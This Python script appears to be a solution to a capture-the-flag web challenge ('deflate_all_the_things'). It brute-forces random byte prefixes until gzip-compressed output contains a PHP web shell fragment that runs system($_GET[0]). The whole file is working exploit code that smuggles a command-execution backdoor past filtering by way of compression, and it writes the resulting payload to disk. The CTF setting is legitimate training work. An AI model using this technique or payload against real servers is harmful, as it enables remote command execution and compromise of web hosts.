import zlib
import gzip
import random
import multiprocessing as mp
import sys


stored_block = b'\x1f\x8b\x08\x00\x9e\xfcY`\x02\xff\x01)\x00\xd6\xff\xe8\x83\x96\xe2\xaa\xa8\xe8\xbb\x95\xe2\xab\x98\xd7\xaa\xec\xa7\xb1\xe0\xb4\xb4*/system($_GET[0]);/*\x8e+\xd7U)\x00\x00\x00'

def save(data):
	f = open("/home/tizian/CTF/CSCG2021/web/deflate_all_the_things/payload.txt", "wb")
	f.write(data)
	f.close()

def gen(n): # Generate random bytes in the BMP
    rand_bytes = b''
    for i in range(n):
        rand_bytes = rand_bytes + chr(random.randrange(0, 65535)).encode('utf8', 'surrogatepass')
    return rand_bytes

def attack():
    while True:
        for i in range(32600,32705):
            rand_bytes = gen(i)
            begin = b"----------- CREATED WITH GZIP PACKER V0.1  -------------------\n"
            #payload = b"<?=/*" #b"*/system($_GET[0]);/*"
            dynamic_block = begin + rand_bytes
            payload = dynamic_block + stored_block
            #to_compress = begin + payload + b"\n" # the newline will be added when fetching the file through internet
            #to_compress = to_compress.replace(b"<", b"&lt;").replace(b">", b"&gt;")
            compressed = gzip.compress(payload, compresslevel=9)
            if b'system' in compressed and b"<?=/*" in compressed: # Check whether the input is in the output
                    #print(to_compress)
                    print("Got result: {0}".format(str(i)))
                    save(payload)
                    sys.exit(0)
                    

if __name__ == "__main__":
    processes = [mp.Process(target=attack) for x in range(8)]

    for p in processes:
        p.start()
